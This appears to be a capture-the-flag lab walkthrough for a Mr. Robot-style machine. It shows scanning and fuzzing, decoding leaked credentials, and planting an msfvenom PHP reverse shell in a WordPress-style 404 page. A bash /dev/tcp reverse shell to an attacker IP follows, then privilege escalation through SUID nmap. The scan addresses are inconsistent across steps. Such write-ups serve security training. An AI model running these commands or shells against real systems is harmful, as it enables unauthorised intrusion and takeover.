<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/cb1c3fb3-2973-4fcd-b957-9ffec2337fb1"></picture>
<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/5223b9fb-f5d2-4f5f-b961-af45d26dec7e"></picture></h1>

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/6509eeef-95c5-43e2-8b41-9294a4206893)

## **PORT 80**
![image](https://github.com/user-attachments/assets/4d0ea598-172c-4067-b1d5-8965d718abcb)

## **PORT 443**
![image](https://github.com/user-attachments/assets/69575dea-cc05-4273-bb14-422b2f5b3a88)

## **Identifying the technologies, servers, and applications that make up the web**
```bash
whatweb http://10.10.223.160
```
![image](https://github.com/user-attachments/assets/f44e3359-cc74-4743-b2c9-c5f3c9e20e4b)
We did not find anything that could help us

## **Fuzzing Web**
```bash
gobuster dir -u http://10.10.223.160/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![image](https://github.com/user-attachments/assets/94c3631c-3f7b-4928-8f52-f9dfbcdd46a9)

![image](https://github.com/user-attachments/assets/3ef2f037-22b6-4065-8eea-bfa7f011dcd9)

![image](https://github.com/user-attachments/assets/95c7db88-bd00-45b9-8c20-009bb548f3b4)

![image](https://github.com/user-attachments/assets/572806d5-12db-440e-88a4-16a6e1785266)

![image](https://github.com/user-attachments/assets/090c0dae-5803-4d51-a495-3a4d453d7dd8)
![image](https://github.com/user-attachments/assets/959d45f4-1b81-484e-975c-ae19f5b99582)<br>
![image](https://github.com/user-attachments/assets/c17c5f8b-fb24-4b15-9f33-20ce7e32b5fb)

## **We found several hidden pages, but in one we found a hash64**
```bash
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```
![image](https://github.com/user-attachments/assets/e5b4b107-1390-43e1-b5d5-653e80accca0)<br>
elliot:ER28-0652<br>
![image](https://github.com/user-attachments/assets/6af5ebc6-25f7-439c-9cd1-0b48cd970cfe)

## **We are going to modify a part of the web in this case the error 404 that when entering a site that does not exist, a code that we will create will be executed and it will return a shell that we will intercept later.**
![image](https://github.com/user-attachments/assets/4bf0c610-9e79-4be4-8b80-c4b3e426c666)

## **Creating the malicious code**
```bash
msfvenom -p php/reverse_php LHOST=10.21.118.81 LPORT=443 -f raw > pwned.php
```
![image](https://github.com/user-attachments/assets/ac8a757b-69b4-47b9-828e-487ea520472a)

## **the code created inside the pwned.php file will be copied into the error 404 page**
![image](https://github.com/user-attachments/assets/045a6510-9a06-4f5a-95e3-0fdb756f7b8b)

## **we go into listening mode **
```bash
nc -nlvp 443
```
![image](https://github.com/user-attachments/assets/d9fac086-7c71-4b2f-9a82-da79777f6e87)<br>

## **we open a website that does not exist**
![image](https://github.com/user-attachments/assets/0160a91f-8439-4866-aff0-03daae79b264)
![image](https://github.com/user-attachments/assets/b4c10518-86b2-4d94-8bce-f5186cfe7066)

```bash
bash -c "sh -i >& /dev/tcp/10.21.118.81/444 0>&1"
```
![image](https://github.com/user-attachments/assets/8f90a8bd-4599-4582-99a8-6968ea941ccf)

```bash
nc -nlvp 444
```
![image](https://github.com/user-attachments/assets/0a5e6e27-269b-44ea-a313-8ea4fa2bb47b)

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```
![image](https://github.com/user-attachments/assets/1f703ba1-e294-4744-b456-e12e5701bbbc)

![image](https://github.com/user-attachments/assets/e55247dd-9190-4e58-afa8-6b7ce096c5cd)
robot:c3fcd3d76192e4007dfb496cca67e13b


![image](https://github.com/user-attachments/assets/b28ef771-3125-4e09-ae60-1889ff2224c3)
abcdefghijklmnopqrstuvwxyz

```bash
su robot
```
![image](https://github.com/user-attachments/assets/a500ac2d-0610-47b0-94e3-db17136edf65)

```bash
find / -perm -4000 2>/dev/null
```
![image](https://github.com/user-attachments/assets/096f03b1-c457-433a-be53-5191ba3a2ec7)

![image](https://github.com/user-attachments/assets/4f1dc63c-4f4c-47f3-898e-399dd036bb9a)

```bash
nmap --interactive
```
![image](https://github.com/user-attachments/assets/4ac2840d-ec78-4792-b939-1d5953ec795d)

```bash
!sh
```
![image](https://github.com/user-attachments/assets/50fcc1fd-b59d-496a-8ab0-a2dab7a681b1)








